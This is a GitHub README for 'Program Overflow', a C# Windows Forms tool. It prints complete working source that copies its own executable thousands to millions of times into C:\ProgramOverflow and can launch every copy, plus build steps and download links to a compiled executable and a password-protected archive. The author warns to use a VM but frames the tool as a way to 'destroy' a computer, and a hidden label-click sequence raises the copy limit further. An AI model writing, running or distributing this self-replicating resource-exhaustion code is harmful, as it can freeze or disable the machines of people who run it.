# Lumito's Program Overflow
Program Overflow is an utility that makes lots of copies of it to later run them. It's DANGEROUS!!! Please use it in a VM.
I'm not responsible of any damage this tool can make to your computer. Use it at your own risk.

![Program overflow image](https://lumitoluma.github.io/images/ProgramOverflow1.1.png)

## Uses of this tool:
1. Test your VM speed and durability.
2. Destroy it!

## Source code analysis:

This is the Form1.cs file, which is the most important one in this project:

```C#
using System.IO;
using System.Windows.Forms;

namespace ProgramOverflow
{
    public partial class Form1 : Form
    {
        byte counterRipPc;
        byte counterRunPrograms;
        byte RunPrograms;
        short x;
        int i;
        int ProgressBar1Value;

        public Form1()
        {
            InitializeComponent();
            counterRipPc = 0;
            counterRunPrograms = 0;
            RunPrograms = 0;
        }

        private void Button1_Click(object sender, System.EventArgs e)
        {
            // Checks if directory exists and make variables
            button1.Enabled = false;
            progressBar1.Value = 0;
            string domainupdowntext = numericUpDown1.Text;
            int NumberOfCopies = int.Parse(domainupdowntext);
            if (!Directory.Exists("C:\\ProgramOverflow"))
            {
                Directory.CreateDirectory("C:\\ProgramOverflow");
            }
            progressBar1.Maximum = NumberOfCopies * 100;
            ProgressBar1Value = progressBar1.Maximum / NumberOfCopies;
            for (i = 1; i <= NumberOfCopies; i++) // Makes the copies
            {
                progressBar1.Value += ProgressBar1Value;
                string destinationFile = "C:\\ProgramOverflow\\Program" + i + ".exe";
                var process = System.Diagnostics.Process.GetCurrentProcess();
                string fullPath = process.MainModule.FileName;
                if (!File.Exists(destinationFile))
                {
                    File.Copy(fullPath, destinationFile, true);
                }
                if (RunPrograms == 1)
                {
                    System.Diagnostics.Process.Start(destinationFile);
                }
            }
            progressBar1.Value = progressBar1.Maximum;
            button1.Enabled = true;
            label1.Text = "Done!!!";
        }

        private void RadioButton1_CheckedChanged(object sender, System.EventArgs e)
        {
                checkBox1.Enabled = true;
                checkBox2.Enabled = true;
        }

        private void CheckBox1_CheckedChanged(object sender, System.EventArgs e)
        {
            if (counterRipPc == 0)
            {
                numericUpDown1.Maximum = 999999;
                label6.Text = "Nº of copies: (Max 999999)";
                counterRipPc = 1;
            }
            else
            {
                numericUpDown1.Maximum = 9999;
                label6.Text = "Nº of copies: (Max 9999)";
                label10.Text = " ";
                counterRipPc = 0;
            }
        }

        private void CheckBox2_CheckedChanged(object sender, System.EventArgs e)
        {
            if (counterRunPrograms == 0)
            {
                RunPrograms = 1;
                counterRunPrograms = 1;
                button1.Text = "Destroy computer";
            }
            else
            {
                RunPrograms = 0;
                counterRunPrograms = 0;
                button1.Text = "Start";
            }
        }

        private void Label7_Click(object sender, System.EventArgs e)
        {
            if(counterRipPc == 1 && x == 0)
            {
                x = 1;
            }
            else
            {
                x = 0;
            }
        }

        private void Label8_Click(object sender, System.EventArgs e)
        {
            if (x == 1)
            {
                x = 2;
            }
            else
            {
                x = 0;
            }
        }

        private void Label9_Click(object sender, System.EventArgs e)
        {
            if (x == 2)
            {
                x = 3;
            }
            else
            {
                x = 0;
            }
        }

        private void Label10_Click(object sender, System.EventArgs e)
        {
            if (x == 3)
            {
                x = 0;
                numericUpDown1.Maximum = 9999999;
                label6.Text = "Nº of copies: (Max 9999999)";
                label10.Text = "Enjoy!";
            }
            else
            {
                x = 0;
            }
        }
    }
}
```

## Building source code:
1. `git clone` the repository or download it using download button.
2. Use `msbuild` to build the repository. If you use the `msbuild` that is included in .NET framework 4.8, you'll just to run `msbuild` to compile it. If you use Visual Studio's `msbuild` you'll need to run `msbuild /p:Configuration=Release /p:Platform="Any CPU"` to build it.
3. Check the bin\Debug or Release folder and search for Program Overflow executable.
4. Done!!! Enjoy using Lumito's Program Overflow!

## Downloading compiled source code:
You can download compiled source code here:

[![Download](https://lumitoluma.github.io/images/Download.png)](https://lumitoluma.github.io/malware/lumitotools/ProgramOverflow1.1.exe)

## Acknowledgements:
Thanks a lot to Endermanch for making those amazing videos that helped me to learn mor about computing and for the first version of ProgramOverflow. You can visit his github in the next link [github.com/endermanch](https://github.com/endermanch), his youtube in this link [youtube.com/endermanch](https://www.youtube.com/endermanch) and the download his ProgramOverflow [here](https://dl.malwat.ch/software/ProgramOverflow.zip) (Passowrd: mysubsarethebest).

And for you for using my software!

Hope you enjoy using it.

#### © 2020, Lumito Luma
